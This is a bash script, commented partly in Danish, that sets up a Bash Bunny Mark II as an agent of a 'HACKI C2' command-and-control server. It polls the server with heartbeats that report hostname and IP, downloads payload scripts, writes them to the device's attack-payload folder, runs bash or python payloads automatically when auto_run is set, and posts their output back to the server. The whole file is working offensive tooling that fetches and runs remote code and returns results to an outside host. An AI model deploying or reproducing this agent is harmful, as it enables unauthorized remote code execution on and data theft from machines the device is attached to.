#!/bin/bash
# ══════════════════════════════════════════════════════════════
# bunny-agent.sh — HACKI C2 Device Agent for Bash Bunny Mark II
# Runs as background service, polls C2 for payloads via heartbeat
# ══════════════════════════════════════════════════════════════
#
# Installation:
#   1. Sæt Bash Bunny i arming mode (switch 3)
#   2. Kopier dette script til /root/bunny-agent.sh
#   3. chmod +x /root/bunny-agent.sh
#   4. Tilføj til /root/.bashrc eller opret systemd service:
#      echo '/root/bunny-agent.sh &' >> /root/.bashrc
#
# Konfiguration: Sæt variablerne nedenfor
# ══════════════════════════════════════════════════════════════

# ── CONFIG ──
C2_URL="${C2_URL:-http://10.13.37.1:3000}"
API_KEY="${API_KEY:-REPLACE_WITH_DEVICE_API_KEY}"
DEVICE_ID="${DEVICE_ID:-1}"
POLL_INTERVAL="${POLL_INTERVAL:-15}"
PAYLOAD_DIR="/root/payloads/switch1"
LOG_FILE="/tmp/bunny-agent.log"
MAX_LOG_SIZE=102400  # 100KB

# ── FUNCTIONS ──

log() {
  local msg="[$(date '+%Y-%m-%d %H:%M:%S')] $1"
  echo "$msg" >> "$LOG_FILE"
  # Rotate log if too large
  if [ -f "$LOG_FILE" ] && [ "$(wc -c < "$LOG_FILE")" -gt "$MAX_LOG_SIZE" ]; then
    tail -100 "$LOG_FILE" > "${LOG_FILE}.tmp" && mv "${LOG_FILE}.tmp" "$LOG_FILE"
  fi
}

get_ip() {
  ip -4 addr show 2>/dev/null | grep -oP 'inet \K[0-9.]+' | grep -v '127.0.0.1' | head -1
}

heartbeat() {
  local hostname
  hostname=$(hostname 2>/dev/null || echo "bunny")
  local ip
  ip=$(get_ip)

  curl -sf -m 10 \
    -H "X-Device-Key: $API_KEY" \
    -H "Content-Type: application/json" \
    -d "{\"hostname\":\"$hostname\",\"ip\":\"$ip\"}" \
    "$C2_URL/api/devices/heartbeat" 2>/dev/null
}

ack_payload() {
  local payload_id="$1"
  curl -sf -m 10 \
    -H "X-Device-Key: $API_KEY" \
    -H "Content-Type: application/json" \
    -X POST \
    "$C2_URL/api/devices/$DEVICE_ID/payload/$payload_id/ack" 2>/dev/null
}

report_result() {
  local payload_id="$1"
  local exit_code="$2"
  local stdout="$3"

  # Truncate stdout to 10KB
  stdout=$(echo "$stdout" | head -c 10240)

  # Escape for JSON
  local escaped
  escaped=$(printf '%s' "$stdout" | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read()))' 2>/dev/null || echo '"output"')

  curl -sf -m 10 \
    -H "X-Device-Key: $API_KEY" \
    -H "Content-Type: application/json" \
    -d "{\"exit_code\":$exit_code,\"stdout\":$escaped}" \
    -X POST \
    "$C2_URL/api/devices/$DEVICE_ID/payload/$payload_id/result" 2>/dev/null
}

write_payload() {
  local script="$1"
  local payload_type="$2"

  mkdir -p "$PAYLOAD_DIR"

  case "$payload_type" in
    duckyscript|bash+duckyscript)
      echo "$script" > "$PAYLOAD_DIR/payload.txt"
      log "Payload written to $PAYLOAD_DIR/payload.txt ($(echo "$script" | wc -c) bytes)"
      ;;
    bash|python)
      echo "$script" > "$PAYLOAD_DIR/payload.sh"
      chmod +x "$PAYLOAD_DIR/payload.sh"
      log "Script written to $PAYLOAD_DIR/payload.sh"
      ;;
    *)
      echo "$script" > "$PAYLOAD_DIR/payload.txt"
      log "Payload written to $PAYLOAD_DIR/payload.txt (unknown type: $payload_type)"
      ;;
  esac
}

execute_payload() {
  local payload_type="$1"
  local output=""
  local code=0

  case "$payload_type" in
    bash)
      output=$("$PAYLOAD_DIR/payload.sh" 2>&1) || code=$?
      ;;
    python)
      output=$(python3 "$PAYLOAD_DIR/payload.sh" 2>&1) || code=$?
      ;;
    *)
      # DuckyScript payloads execute on next boot/switch — report as written
      output="DuckyScript payload written. Will execute on next switch1 boot."
      code=0
      ;;
  esac

  echo "$output"
  return $code
}

# ── MAIN LOOP ──

log "════════════════════════════════════"
log "HACKI C2 Bunny Agent started"
log "C2: $C2_URL | Device: $DEVICE_ID"
log "Poll interval: ${POLL_INTERVAL}s"
log "════════════════════════════════════"

while true; do
  # 1. Heartbeat + check for pending payload
  RESP=$(heartbeat)

  if [ -z "$RESP" ]; then
    log "[WARN] Heartbeat failed — C2 unreachable"
    sleep "$POLL_INTERVAL"
    continue
  fi

  # 2. Parse response
  PAYLOAD_ID=$(echo "$RESP" | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("pending_payload",{}).get("payload_id",""))' 2>/dev/null)

  if [ -n "$PAYLOAD_ID" ] && [ "$PAYLOAD_ID" != "None" ] && [ "$PAYLOAD_ID" != "" ]; then
    log "[RECV] Payload $PAYLOAD_ID received"

    SCRIPT=$(echo "$RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin)["pending_payload"]["payload_script"])' 2>/dev/null)
    PTYPE=$(echo "$RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin)["pending_payload"]["payload_type"])' 2>/dev/null)
    AUTORUN=$(echo "$RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin)["pending_payload"].get("auto_run",False))' 2>/dev/null)

    # 3. Write payload to disk
    write_payload "$SCRIPT" "$PTYPE"

    # 4. ACK
    ack_payload "$PAYLOAD_ID"
    log "[ACK] Payload $PAYLOAD_ID acknowledged"

    # 5. Auto-execute if enabled and type supports it
    if [ "$AUTORUN" = "True" ] || [ "$AUTORUN" = "true" ]; then
      log "[EXEC] Auto-running payload $PAYLOAD_ID (type: $PTYPE)"
      OUTPUT=$(execute_payload "$PTYPE")
      EXIT_CODE=$?
      log "[DONE] Payload $PAYLOAD_ID exit=$EXIT_CODE"
      report_result "$PAYLOAD_ID" "$EXIT_CODE" "$OUTPUT"
    else
      log "[WAIT] Payload $PAYLOAD_ID written — auto_run disabled, awaiting manual trigger"
      # Report as written (not executed)
      report_result "$PAYLOAD_ID" "0" "Payload written to disk. Awaiting manual execution or switch boot."
    fi
  fi

  sleep "$POLL_INTERVAL"
done
